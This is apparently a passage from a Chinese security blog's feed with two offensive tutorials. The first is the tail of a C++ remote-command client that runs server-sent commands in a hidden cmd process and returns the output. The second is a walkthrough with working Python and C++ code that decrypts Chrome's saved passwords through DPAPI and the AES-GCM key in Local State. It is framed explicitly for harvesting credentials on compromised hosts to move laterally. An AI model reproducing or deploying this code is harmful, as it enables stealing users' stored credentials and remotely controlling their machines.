ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(ServerPort);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ServerIP);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] connect ...\n&quot;</span>;<br>    <span class="hljs-comment">//建立连接</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">connect</span>(g_ClientSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] connect Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>连接后就是负责接收服务端传输的数据,也就是dos命令,并执行,将执行后的结果返回服务端(这里先返回一个ok)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">SendRet</span><span class="hljs-params">(LPSTR pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, pszSend, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent Bytes:&quot;</span> &lt;&lt; pszSend &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">RecvCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//char szRetBuffer[11240] = &#123; 0 &#125;;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">int</span> ret = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-built_in">system</span>(szBuffer);<br>        <span class="hljs-built_in">SendRet</span>((LPSTR)<span class="hljs-string">&quot;ok&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里已经实现了可以循环执行命令,那么现在就是要把控制台输出数据传输回来。<br><img src="/img/socket/2.png"></p><p>这里把<code>system</code>函数替换掉,利用<code>CreatePipe</code>匿名管道一边读,一边写,再通过<code>CreateProcess</code>创建cmd进程执行命令,将返回的数据读进管道,再读出到缓存区,返回到服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcessA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpApplicationName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTR                 lpCommandLine,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL                  bInheritHandles,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID                lpEnvironment,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpCurrentDirectory,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">GetCmdData</span><span class="hljs-params">(LPSTR lpscmd, LPSTR lpsRetBuffer,DWORD RetBufferSize)</span></span><br><span class="hljs-function"></span>&#123;<br>    SECURITY_ATTRIBUTES sa;<br>    HANDLE hRead, hWrite;<br>    sa.bInheritHandle = TRUE;<br>    sa.nLength = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sa);<br>    sa.lpSecurityDescriptor = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//创建匿名管道</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hRead, &amp;hWrite, &amp;sa, <span class="hljs-number">0</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreatePipe Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置新进程参数</span><br>    STARTUPINFOA si = &#123;<span class="hljs-number">0</span>&#125;;<br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;;<br>    si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>    si.hStdError = hWrite;<br>    si.hStdOutput = hWrite;<br>    si.wShowWindow = SW_HIDE;<br>    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<br>    <span class="hljs-comment">//创建进程执行命令</span><br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, lpscmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreateProcess Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hWrite);<br>    <span class="hljs-comment">//等待命令执行结束</span><br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);<br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);<br>    <span class="hljs-comment">//读取管道中的数据,即执行命令后的结果</span><br>    ::<span class="hljs-built_in">RtlZeroMemory</span>(lpsRetBuffer, RetBufferSize);<br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ReadFile</span>(hRead, lpsRetBuffer, <span class="hljs-number">10000</span>, &amp;RetBufferSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ReadFile Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hRead);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/socket/3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用c++抓取Chrome所有版本密码</title>
    <link href="/2021/06/20/CatchChrome/"/>
    <url>/2021/06/20/CatchChrome/</url>
    
    <content type="html"><![CDATA[<p>工具已上传到github:<a href="https://github.com/SD-XD/Catch-Browser">https://github.com/SD-XD/Catch-Browser</a></p><h2 id="谷歌浏览器存储密码的方式"><a href="#谷歌浏览器存储密码的方式" class="headerlink" title="谷歌浏览器存储密码的方式"></a>谷歌浏览器存储密码的方式</h2><p>在使用谷歌浏览器时,如果我们输入某个网站的账号密码,他会自动问我们是否要保存密码,以便下次登录的时候自动填写账号和密码<br><img src="/img/CatchChrome/1.png"></p><p>在设置中可以找到登录账户和密码</p><p><img src="/img/CatchChrome/2.png"></p><p>也可以直接看密码,不过需要凭证</p><p><img src="/img/CatchChrome/3.png"></p><p>这其实是windows的DPAPI机制</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Data Protection Application Programming Interface(数据保护API)</p><p>DPAPI是Windows系统级对数据进行加解密的一种接口无需自实现加解密代码微软已经提供了经过验证的高质量加解密算法提供了用户态的接口对密钥的推导存储数据加解密实现透明并提供较高的安全保证</p><p>DPAPI提供了两个用户态接口<code>CryptProtectData</code>加密数据<code>CryptUnprotectData</code>解密数据加密后的数据由应用程序负责安全存储应用无需解析加密后的数据格式。但是加密后的数据存储需要一定的机制因为该数据可以被其他任何进程用来解密当然<code>CryptProtectData</code>也提供了用户输入额外数据来参与对用户数据进行加密的参数但依然无法放于暴力破解。</p><p>微软提供了两个接口用来加密和解密,<code>CryptProtectMemory</code>和<code>CryptUnprotectMemory</code></p><p>实际上,在老版本(80之前)的谷歌浏览器,仅仅是使用了<code>CryptProtectMemory</code>来对密码进行加密</p><h2 id="80版本之前的Chrome"><a href="#80版本之前的Chrome" class="headerlink" title="80版本之前的Chrome"></a>80版本之前的Chrome</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win7</li><li>Chrome版本 79.0.3945.117</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>chrome的密码经过加密后存储在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data<br></code></pre></td></tr></table></figure><p>如果用二进制文本编辑器查看的化会发现他其实是一个sqlite数据库文件</p><p><img src="/img/CatchChrome/4.png"></p><p>可以使用工具SQLiteStudio打开他</p><p>双击logins</p><p><img src="/img/CatchChrome/5.png"></p><p>选择data<br><img src="/img/CatchChrome/6.png"></p><p>可以看到有用户名和网址,却没有密码</p><p>但是密码的二进制实际是有值的</p><p><img src="/img/CatchChrome/7.png"></p><h3 id="编写脚本解密"><a href="#编写脚本解密" class="headerlink" title="编写脚本解密"></a>编写脚本解密</h3><p>python的解密是最简洁的，这里送上一个三好学生的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> win32crypt<br><span class="hljs-keyword">import</span> binascii<br>conn = sqlite3.connect(getenv(<span class="hljs-string">&quot;APPDATA&quot;</span>) + <span class="hljs-string">&quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;</span>)<br>cursor = conn.cursor()<br>cursor.execute(<span class="hljs-string">&#x27;SELECT action_url, username_value, password_value FROM logins&#x27;</span>)<br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> cursor.fetchall():<br>    password = win32crypt.CryptUnprotectData(result[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> password:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Site: &#x27;</span> + result[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Username: &#x27;</span> + result[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Password: &#x27;</span> + password<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;no password found&quot;</span><br></code></pre></td></tr></table></figure><p>但我还是想c++写一个</p><p>编写之前,需要配置sqlite3环境,并且下载<code>&lt;sqlite3.h&gt;</code>和<code>&lt;sqlite3.c&gt;</code>文件</p><p>如果当前用户正在使用谷歌,是无法打开数据库的,于是我们可以复制一份出来操作</p><p><img src="/img/CatchChrome/8.png"></p><p>再通过sql语句查找logins表</p><p><img src="/img/CatchChrome/9.png"></p><p>在回调函数中解密</p><p><img src="/img/CatchChrome/10.png"></p><p>看下效果,完美解出密码</p><p><img src="/img/CatchChrome/11.png"></p><p>与谷歌浏览器上面看到的也是一样的,无需再验证用户密码</p><p><img src="/img/CatchChrome/12.png"></p><h2 id="80版本之后的Chrome"><a href="#80版本之后的Chrome" class="headerlink" title="80版本之后的Chrome"></a>80版本之后的Chrome</h2><p>那么80.x之后的Chrome如何解密呢</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win10</li><li>Chrome版本 91.0.4472.101(最新版)</li></ul><h3 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h3><p>先看一下跟以前版本的Chrome存储方式上有什么区别</p><p><img src="/img/CatchChrome/13.png"></p><p><img src="/img/CatchChrome/14.png"></p><p>判断是否是新版本的Chrome加密其实就是看它加密后值的前面有没有v10或者v11</p><p>看官方文档,分析新版加密算法</p><p>key的初始化<br><a href="https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea">https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea</a></p><p><img src="/img/CatchChrome/15.png"></p><p><img src="/img/CatchChrome/16.png"><br>注释:尝试从local state提取密钥。</p><p>并且可以看到<code>kDPAPIKeyPrefix</code>实际上就是一个字符串”DPAPI”</p><p><img src="/img/CatchChrome/17.png"></p><p>然后就是进行DPAPI的解密,最后就是如果key不在local state中或者DPAPI解密失败,就重新生成一个key</p><p>从这里我们我可以大致分析出key初始化时的动作:</p><ol><li>从local state文件中提取key</li><li>base64解密key</li><li>去除key开头的“DPAPI”</li><li>DPAPI解密,得到最终的key</li></ol><p>跟进<code>GetString</code>函数的参数<code>kOsCryptEncryptedKeyPrefName</code></p><p><img src="/img/CatchChrome/18.png"></p><p>知道key存放在local state文件os_crypt.encrypted_key字段中,即</p><p><img src="/img/CatchChrome/19.png"></p><p>而local state文件就在本地默认目录:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\L</span>ocal State<br></code></pre></td></tr></table></figure><p>Local State是一个JSON格式的文件</p><h3 id="明文加密方式"><a href="#明文加密方式" class="headerlink" title="明文加密方式"></a>明文加密方式</h3><p>看源码注释</p><p><img src="/img/CatchChrome/20.png"></p><p>密钥加密后数据前缀是“v10”</p><p><img src="/img/CatchChrome/21.png"></p><p>密钥和NONCE/IV的长度分别为：32字节和12字节</p><p><img src="/img/CatchChrome/22.png"></p><p>这里解释一下NONCE/IV是什么:</p><p>如果我们不希望相同的明文通过密钥加密出来的密文是相同的(这样很容易让攻击者知道这两条密文的明文是相同的) 解决办法是使用IV（初始向量）或nonce（只使用一次的数值）。因为对于每条加密消息，我们都可以使用不同的byte字符串。它们是非确定理论的起源，而这种理论要求制造出令人难以分辨的副本。这些消息通常不是什么秘密，但为了解密需要，我们会在分发时对它们进行加密。 IV与nonce之间的区别是有争议的，但也不是没有关联的。不同的加密方案所保护的侧重点也不同：有些方案需要的只是密文不重复，这种情况我们通常叫作nonce；还有一些方案需要密文是随机的，甚至完全不可预测的，这种情况我们通常叫作IV。这里其实就是希望即便明文相同,经过加密后的密文也不相同。</p><p>再往下翻,其实可以看到解密函数</p><p><img src="/img/CatchChrome/23.png"></p><p><code>encrypted_value</code>的前缀v10后为12字节的NONCE（IV），然后再是真正的密文。Chrome使用的是AES-256-GCM的AEAD对称加密、</p><p>那么思路就清晰了,这里我自己画了一个图来总结算法</p><p><img src="/img/CatchChrome/24.png"></p><p>实现自动化抓密码<br>解密使用一个非常强大的库,cryptopp</p><p>先获取原始的key</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">GetOriginalkey</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string Decoded = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//获取Local State中的未解密的key</span><br>    string key = <span class="hljs-string">&quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADWXmStECIlTZZxWMAYf5UmAAAAAAIAAAAAABBmAAAAAQAAIAAAAP8V1h3J1qhEf8/h13hre+e3EMW0oD41Ux7UrEqls4DoAAAAAA6AAAAAAgAAIAAAAA7xXGgN1Hks1TbInimvYa0TnMfPa0jPpmlI9BDiUQAAMAAAAPzO7wya37iu97rDB4UTtn5QwQcuJkw2E3cw/tHuSnHdNv4qwXMWLC2oU3TkysoXmUAAAAAtPkLwNaInulyoGNH4GDxlwbzAW4DP7T8XWsZ/2QB0YrcLqxSNytHlV1qvVyO8D20Eu7jKqD/bMW2MzwEa40iF&quot;</span>;<br>    <span class="hljs-built_in">StringSource</span>((BYTE*)key.<span class="hljs-built_in">c_str</span>(), key.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Base64Decoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded)));<br>    key = Decoded;<br>    key = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">//去除首位5个字符DPAPI</span><br>    Decoded.<span class="hljs-built_in">clear</span>();<span class="hljs-comment">//DPAPI解密</span><br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    DATA_BLOB DataOut = &#123; <span class="hljs-number">0</span> &#125;;<br>    DATA_BLOB DataVerify = &#123; <span class="hljs-number">0</span> &#125;;<br>    DataOut.pbData = (BYTE*)key.<span class="hljs-built_in">c_str</span>();<br>    DataOut.cbData = <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptUnprotectData</span>(&amp;DataOut, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;DataVerify)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Decryption failure: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Decryption successfully!\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; DataVerify.cbData; i++)<br>        &#123;<br>            result[i] = DataVerify.pbData[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果当前chrome版本并不是80+,可以通过一个简单的判断:就是看加密密码前有没有”v10“或者”v11“</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">string e_str = argv[<span class="hljs-number">2</span>];<br><span class="hljs-comment">//判断密文是否包含v10或v11,如果包含则说明是80+的Chrome,用新的解密方法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v10&quot;</span>) != <span class="hljs-literal">NULL</span> || <span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v11&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">NewDecrypt</span>(argc, argv, azColName);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">DecryptoByDPAPI</span>(argv, azColName);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>然后就是解密密文</p><p>获取iv和密文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//argv[2]是password_value的值</span><br>chiper = argv[<span class="hljs-number">2</span>];<br>iv = argv[<span class="hljs-number">2</span>];<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">15</span>);  <span class="hljs-comment">//获取iv的值</span><br>chiper = chiper.<span class="hljs-built_in">substr</span>(<span class="hljs-number">15</span>);   <span class="hljs-comment">//加密密码的值</span><br></code></pre></td></tr></table></figure><p>再用<code>cyptopp</code>强大的库函数进行解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取iv hex编码值</span><br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">HexEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Encoded)));<br>iv = Encoded;<br>Encoded.<span class="hljs-built_in">clear</span>();<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, iv.<span class="hljs-built_in">size</span>() - <span class="hljs-number">6</span>);<br>CHAR Pass_Word[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">HexDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded))); <br>iv = Decoded;<br>Decoded.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">char</span>* key = <span class="hljs-built_in">GetOriginalkey</span>();<br>d.<span class="hljs-built_in">SetKeyWithIV</span>((BYTE*)key, <span class="hljs-number">32</span>, (BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-built_in">StringSource</span>(chiper, <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticatedDecryptionFilter</span>(d,<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(password)));<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; password.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br>    Pass_Word[i] = password[i];<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">0</span>], argv[<span class="hljs-number">0</span>] ? argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">1</span>], argv[<span class="hljs-number">1</span>] ? argv[<span class="hljs-number">1</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">2</span>], Pass_Word);<br></code></pre></td></tr></table></figure><p>这里逻辑的话参照上面分析步骤,这里就不再赘述</p><p>最后看看解密效果<br><img src="/img/CatchChrome/25.png"></p><p><img src="/img/CatchChrome/26.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实战中如果拿到一台主机,并且安装有chrome,我们就可以抓取密码以便快速精确地横向。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
